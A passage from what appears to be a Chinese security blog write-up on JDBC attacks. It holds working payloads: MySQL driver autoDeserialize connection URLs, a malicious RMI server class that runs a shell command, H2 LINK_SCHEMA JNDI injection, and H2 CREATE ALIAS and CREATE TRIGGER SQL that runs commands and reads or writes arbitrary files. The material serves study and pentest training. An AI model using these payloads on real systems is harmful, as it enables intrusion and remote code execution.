<span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">// getObject(2)</span><br><span class="hljs-keyword">if</span> (field.isBinary() || field.isBlob()) &#123;<br>    <span class="hljs-type">byte</span>[] data = getBytes(columnIndex);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getObject</code>åˆ¤æ–­MySQLç±»å‹ä¸ºBLOBåï¼Œä»MySQLæœåŠ¡ç«¯è·å–å¯¹åº”çš„å­—èŠ‚ç æ•°æ®</p><p>ä»MySQLæœåŠ¡ç«¯è·å–åˆ°å­—èŠ‚ç æ•°æ®åï¼Œåˆ¤æ–­<code>autoDeserialize</code>æ˜¯å¦ä¸ºtrueï¼ˆè¿æ¥URLä¸­è®¾ç½®äº†<code>autoDeserialize=true</code>ï¼‰ã€å­—èŠ‚ç æ•°æ®æ˜¯å¦ä¸ºåºåˆ—åŒ–å¯¹è±¡ï¼ˆå‰ä¸¤ä¸ªå­—èŠ‚ä¸º<code>-84</code>å’Œ<code>-19</code>æ ‡è¯†åºåˆ—åŒ–å¯¹è±¡ï¼‰ç­‰ï¼Œæœ€åè°ƒç”¨<code>readObject</code>è§¦å‘ååºåˆ—åŒ–æ¼æ´</p><p><img src="/2024/08/13/JDBC/image-20240813175118532.png" alt="image-20240813175118532"></p><p><img src="/2024/08/13/JDBC/image-20240813175141320.png" alt="image-20240813175141320"></p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><code>ServerStatusDiffInterceptor</code>è§¦å‘ã€‚</p><h4 id="8-x"><a href="#8-x" class="headerlink" title="8.x&lt;&#x3D;8.0.20"></a>8.x&lt;&#x3D;8.0.20</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h4><p><code>queryInterceptors</code>æ”¹å<code>statementInterceptors</code></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-1-11"><a href="#5-1-11" class="headerlink" title="&gt;&#x3D;5.1.11"></a>&gt;&#x3D;5.1.11</h4><p>åŒ…åä¸å«<code>cj</code></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-x"><a href="#5-x" class="headerlink" title="5.x&lt;&#x3D;5.1.10"></a>5.x&lt;&#x3D;5.1.10</h4><p>åŒä¸Šï¼Œéœ€è¦è¿æ¥åæ‰§è¡ŒæŸ¥è¯¢</p><h3 id="detectCustomCollationsè§¦å‘"><a href="#detectCustomCollationsè§¦å‘" class="headerlink" title="detectCustomCollationsè§¦å‘"></a><code>detectCustomCollations</code>è§¦å‘</h3><h4 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29~5.1.40"></a>5.1.29~5.1.40</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19~5.1.28"></a>5.1.19~5.1.28</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?autoDeserialize=true</span><br></code></pre></td></tr></table></figure></blockquote><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/mysql">MySQL JDBC Attack | Java (gitbook.io)</a></p><p>[MySQL JDBCååºåˆ—åŒ–æ¼æ´ <a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"> Mi1k7ea ]</a></p><p><a href="https://www.anquanke.com/post/id/203086">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="H2-JDBC"><a href="#H2-JDBC" class="headerlink" title="H2-JDBC"></a>H2-JDBC</h2><p>ä¹Ÿæ›¾åœ¨HGAMEçš„æ–°ç”Ÿèµ›ä¸Šè§åˆ°äº†H2æ•°æ®åº“çš„SQLæ³¨å…¥&#x3D;&gt;RCEæ¼æ´ï¼Œè€Œä¸”è¯¾å†…æ•°æ®åº“å¼€å‘æˆ‘ä¹Ÿæ˜¯ç”¨çš„H2æ•°æ®åº“äº¤äº†ä¸€æ¬¡ä½œä¸šhhhï¼Œæ‰€ä»¥å°è±¡è¿˜æ˜¯æ¯”è¾ƒæ·±ã€‚</p><p>JDBCæ˜¯JDKæä¾›çš„ä¸€ä¸ªç”¨äºè¿æ¥æ•°æ®åº“çš„æ¥å£(Java DataBase Connectivity)ï¼Œå„ä¸ªæ•°æ®åº“å‚å•†(MySQLã€Oracleã€SQLServer)è´Ÿè´£ç¼–å†™è‡ªå·±çš„JDBCå®ç°ç±»ï¼Œå†æŠŠè¿™äº›å®ç°ç±»æ‰“åŒ…ä¸ºé©±åŠ¨jaråŒ…ï¼Œæˆ‘ä»¬ä½¿ç”¨JDBCçš„æ¥å£ç¼–ç¨‹ï¼ŒèƒŒåè°ƒç”¨çš„å®åˆ™æ˜¯å®ç°ç±»é‡Œçš„æ–¹æ³•ã€‚</p><p>å¸¸è§çš„JDBCä½¿ç”¨æ–¹æ³•æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å†™å¥½JDBCå¼•æ“ã€è¿æ¥æ•°æ®åº“çš„URLã€è´¦æˆ·ã€å¯†ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>;  <span class="hljs-comment">//testæ•°æ®åº“</span><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-comment">// å»ºç«‹è¿æ¥</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(JDBC_URL, JDBC_USER,<br>JDBC_PASSWORD);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> è®¿é—®æ•°æ®åº“</span><br><span class="hljs-comment">// å…³é—­è¿æ¥</span><br>conn.close();<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆJDBCè¿æ¥çš„URLæ€ä¹ˆèƒ½å¤Ÿè®©ç”¨æˆ·æ§åˆ¶å¾—åˆ°å‘¢ï¼Ÿå®é™…åœ¨ä¸€äº›åœºæ™¯æˆ–è€…æ¸—é€æµ‹è¯•é‡Œï¼Œæ¯”å¦‚åå°ä¿®æ”¹æ•°æ®åº“é…ç½®ã€æµ‹è¯•æ•°æ®åº“è¿æ¥ä¸­ï¼Œç®¡ç†å‘˜å°±å¯ä»¥æ§åˆ¶JDBCçš„è¿æ¥URLã€‚</p><p>å› æ­¤è¿™ç±»æ¼æ´ä¸»è¦æ˜¯åœ¨åå°ç®¡ç†(å½“ç„¶ç¬¬ä¸€æ­¥å¾—æ”»è¿›åå°ï¼Œæœªæˆæƒã€å¼±å¯†é’¥ã€é€»è¾‘æ¼æ´ç­‰ç­‰ç­‰)ã€‚</p><p>æ­¤å¤„ä»‹ç»h2 databaseçš„ç›¸å…³æ¼æ´ã€‚</p><p>H2æ˜¯ä¸€ä¸ªç”¨Javaç¼–å†™çš„æ•°æ®åº“ï¼Œæ”¯æŒå†…å­˜(æœ‰ç‚¹åƒsqlite)ã€æ–‡ä»¶ç­‰æ¨¡å¼ï¼Œåªæœ‰ä¸€ä¸ªjaræ–‡ä»¶ï¼Œé€‚åˆä½œä¸ºåµŒå…¥å¼æ•°æ®åº“ä½¿ç”¨ã€‚ä¸»è¦ç”¨äºå•å…ƒæµ‹è¯•ã€‚H2æä¾›äº†ä¸€ä¸ªwebæ§åˆ¶å°ç”¨äºæ“ä½œå’Œç®¡ç†æ•°æ®åº“ã€‚</p><h3 id="H2è¿æ¥"><a href="#H2è¿æ¥" class="headerlink" title="H2è¿æ¥"></a>H2è¿æ¥</h3><p>ä¸€èˆ¬æˆ‘ä»¬ä¼šç”¨SpringBootæ¥æ•´åˆH2ã€‚</p><p>h2 database consoleå¯ä»¥æ•´åˆåˆ°SpringBootä¸­ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å¯åŠ¨(å…¶å†…ç½®äº†ä¸€ä¸ªWebServer)</p><p>H2æ”¯æŒè¿è¡Œä¸‰ç§æ¨¡å¼ï¼š</p><p>Embedded(åµŒå…¥å¼)-&gt;æ— éœ€é…ç½®æœ¬åœ°&#x2F;è¿œç¨‹æ•°æ®åº“; æ•°æ®åº“è¿æ¥å…³é—­æ—¶, æ•°æ®ä¸è¡¨ç»“æ„ä¾ç„¶å­˜åœ¨;</p><p>In-Memory(å†…å­˜æ¨¡å¼)-&gt;æ— éœ€é…ç½®æœ¬åœ°&#x2F;è¿œç¨‹æ•°æ®åº“, ä½†æ•°æ®åº“è¿æ¥å…³é—­æ—¶ï¼Œæ•°æ®ä¸è¡¨ç»“æ„ä¸¢å¤±;</p><p>ServerMode(ä¼ ç»Ÿæ¨¡å¼)-&gt;éœ€è¦é…ç½®æœ¬åœ°&#x2F;è¿œç¨‹æ•°æ®åº“;</p><h4 id="jarå¯åŠ¨"><a href="#jarå¯åŠ¨" class="headerlink" title="jarå¯åŠ¨"></a>jarå¯åŠ¨</h4><p>è¿™é‡Œçœä¸ªäº‹æŠ„äº†ã€‚å®é™…ä¸ŠæŠŠh2æŒ‚åœ¨ä¾èµ–é‡Œï¼Œå¯åŠ¨é¡¹ç›®å°±èƒ½å¯åŠ¨H2ã€‚</p><p>åœ¨<a href="http://www.h2database.com/html/cheatSheet.html">å®˜ç½‘</a>ä¸‹è½½jaråŒ…ï¼Œè°ƒç”¨é‡Œé¢çš„<code>org.h2.tools.Server</code>ç±»</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-help</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/13/JDBC/image-20240813175959888.png" alt="image-20240813175959888"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-web</span> <span class="hljs-literal">-webAllowOthers</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨Web consoleï¼Œé»˜è®¤ç›‘å¬8082ç«¯å£</p><p>H2çš„Web consoleä¸ä»…å¯ä»¥è¿æ¥H2æ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥è¿æ¥å…¶ä»–æ”¯æŒJDBC APIçš„æ•°æ®åº“</p><p><img src="/2024/08/13/JDBC/image-20240813180049784.png" alt="image-20240813180049784"></p><p>H2æ•°æ®åº“é»˜è®¤ç”¨æˆ·åä¸ºsaã€å¯†ç ä¸ºç©ºï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813180102966.png" alt="image-20240813180102966"></p><h4 id="SpringBootæ•´åˆ"><a href="#SpringBootæ•´åˆ" class="headerlink" title="SpringBootæ•´åˆ"></a>SpringBootæ•´åˆ</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>application.properties</code>ä¸­æ·»åŠ h2è¿æ¥çš„é…ç½®</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">org.h2.Driver</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:h2:mem:test</span><br><span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">sa</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string"></span><br><br><span class="hljs-attr">spring.h2.console.enabled</span>=<span class="hljs-string">true</span><br><span class="hljs-attr">spring.h2.console.path</span>=<span class="hljs-string">/h2</span><br><span class="hljs-attr">spring.h2.console.settings.trace</span>=<span class="hljs-string">false</span><br><span class="hljs-attr">spring.h2.console.settings.web-allow-others</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œspringbootå¯ä»¥ä¿®æ”¹h2 consoleçš„è®¿é—®è·¯å¾„ï¼Œè‹¥æœªé…ç½®æ­¤é¡¹é»˜è®¤ä¸º<code>h2-console</code></p><p>demoå°±å…äº†ï¼Œç½‘ä¸Šä¸€å¤§æŠŠã€‚</p><h3 id="H2-JNDI"><a href="#H2-JNDI" class="headerlink" title="H2-JNDI"></a>H2-JNDI</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8025</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;touch /tmp/h2-jndi-success&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨BeanFactoryæœ¬åœ°å·¥å‚ç±»å®ç°çš„JNDIï¼ŒH2æ˜¯æ”¯æŒçš„ã€‚</p><p><img src="/2024/08/13/JDBC/image-20240813180357092.png" alt="image-20240813180357092"></p><p>é«˜ç‰ˆæœ¬çš„H2åªå…è®¸JNDI lookupçš„URLä»¥javaå¼€å¤´ï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813180414155.png" alt="image-20240813180414155"></p><p>è€Œåœ¨H2çš„å‡½æ•°æ–‡æ¡£ä¸­èƒ½å‘ç°ä¸€å¤„å¯èƒ½é€ æˆJNDIæ³¨å…¥çš„ï¼š<code>LINK_SCHEMA</code></p><p><a href="http://www.h2database.com/html/functions.html#link_schema">http://www.h2database.com/html/functions.html#link_schema</a></p><p><img src="/2024/08/13/JDBC/image-20240813180443447.png" alt="image-20240813180443447"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> LINK_SCHEMA(<span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;javax.naming.InitialContext&#x27;</span>, <span class="hljs-string">&#x27;rmi://127.0.0.1:8025/evil&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;PUBLIC&#x27;</span>);<br></code></pre></td></tr></table></figure><p>åŒæ ·é«˜ç‰ˆæœ¬å¯¹URLè¿›è¡Œäº†é™åˆ¶ï¼Œåªå…è®¸javaå¼€å¤´</p><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2-RCE"></a>H2-RCE</h3><h4 id="UDFæ‰§è¡Œ"><a href="#UDFæ‰§è¡Œ" class="headerlink" title="UDFæ‰§è¡Œ"></a>UDFæ‰§è¡Œ</h4><ul><li><code>CREATE ALIAS</code></li></ul><p>è‡ªå®šä¹‰å‡½æ•°</p><p>åˆ›å»ºä¸€ä¸ªshellå‡½æ•°å¹¶è°ƒç”¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> ALIAS IF <span class="hljs-keyword">EXISTS</span> shell;<br><span class="hljs-keyword">CREATE</span> ALIAS shell <span class="hljs-keyword">AS</span> $$void shell(String s) throws Exception &#123;<br>java.lang.Runtime.getRuntime().<span class="hljs-keyword">exec</span>(s);<br>&#125;$$;<br><span class="hljs-keyword">SELECT</span> shell(<span class="hljs-string">&#x27;cmd /c calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>h2ä¸­ä¸¤ä¸ª<code>$</code>è¡¨ç¤ºæ— éœ€è½¬ä¹‰çš„é•¿å­—ç¬¦ä¸²</p><p>å¯¹æ¯”é«˜ç‰ˆæœ¬çš„H2ï¼Œ<code>handleSyntaxError</code>å¤šä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œè‹¥ç¬¬äºŒä¸ªå‚æ•°æ˜¯0åˆ™ç›´æ¥è¿”å›ï¼Œä¸è¿›è¡Œè¯­æ³•é”™è¯¯å¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">handleSyntaxError*(output, (ok? <span class="hljs-number">0</span>: <span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>é‚£å¦‚æœé‡ä¸Šç›®æ ‡ç”¨äº†lombokè¿˜æ˜¯H2ä½ç‰ˆæœ¬å‘¢?åªèƒ½è€ƒè™‘è°ƒç”¨ç›®æ ‡æœ¬åœ°çš„é™æ€å…¬å¼€æ–¹æ³•</p><p>å¦‚<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>æœ‰ä¸¤ä¸ªè¯»å†™æ–‡ä»¶çš„é™æ€å…¬å¼€æ–¹æ³•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS read <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromFile&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> read(<span class="hljs-string">&#x27;E:/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è¯»å‡ºæ¥çš„ç»“æœä¸ºbyteæ•°ç»„ï¼Œè¿˜å¾—è½¬ä¸ºå­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = &#123;<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>&#125;;<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));  <span class="hljs-comment">// æ‰“å°here is my flag</span><br></code></pre></td></tr></table></figure><p>è™½ç„¶<code>writeBytesToFilename</code>ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚ä¸ºbyteæ•°ç»„ï¼Œä½†ä¼ å­—ç¬¦ä¸²ä¹Ÿè¡Œï¼ŒH2èƒ½å¤Ÿè‡ªåŠ¨è½¬æ¢ã€‚æˆ–è€…åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å‰é¢åŠ ä¸ªXã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS write <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/success.txt&#x27;</span>, <span class="hljs-string">&#x27;Arbitrary File Write&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/wirte_hex.txt&#x27;</span>, X<span class="hljs-string">&#x27;68657265206973206d7920666c6167&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰å…¶ä»–é™æ€æ–¹æ³•å¯ä»¥åˆ©ç”¨ï¼Œæ¯”å¦‚</p><ul><li><code>java.sql.DriverManager#getConnection</code> è¿æ¥æ¶æ„MySQLæœåŠ¡å™¨</li><li><code>javax.naming.InitialContext#doLookup</code> JNDIæ³¨å…¥</li><li><code>com.alibaba.fastjson.JSON#parseObject</code> FastJsonååºåˆ—åŒ–</li><li><code>org.springframework.util.SerializationUtils.deserialize</code> äºŒæ¬¡ååºåˆ—åŒ–</li></ul><h4 id="jsæ‰§è¡Œ"><a href="#jsæ‰§è¡Œ" class="headerlink" title="jsæ‰§è¡Œ"></a>jsæ‰§è¡Œ</h4><ul><li><code>CREATE TRIGGER</code></li></ul><p>è¿™ä¸ªå‘½ä»¤ç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œåˆ©ç”¨çš„æ˜¯è§¦å‘å™¨ï¼Œå³å¢åˆ æ”¹æ—¶ä¼šè§¦å‘ä¸€äº›åŠ¨ä½œï¼Œéœ€è¦æ–°å»ºä¸€å¼ è¡¨ï¼Œæˆ–è€…éœ€è¦æœ‰å·²çŸ¥è¡¨ã€‚</p><p>ä¸‹é¢ä¸Šç½‘ä¸Šæµä¼ çš„pocï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hack (<br>     id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS AFTER <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> hack <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;<br> <br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hack <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>ä½†å®é™…ä¸Šåˆ›å»ºè§¦å‘å™¨æ—¶é‚£æ®µjsä»£ç å°±è¢«æ‰§è¡Œäº†ï¼Œåé¢æ’å…¥æ•°æ®ä¹Ÿæ²¡æœ‰æ‰§è¡Œ</p><p>å¥½åœ¨è¿™å¥åˆ›å»ºè§¦å‘å™¨çš„è¯­å¥å¯ä»¥å¤šæ¬¡æ‰§è¡Œ(å› ä¸ºæ 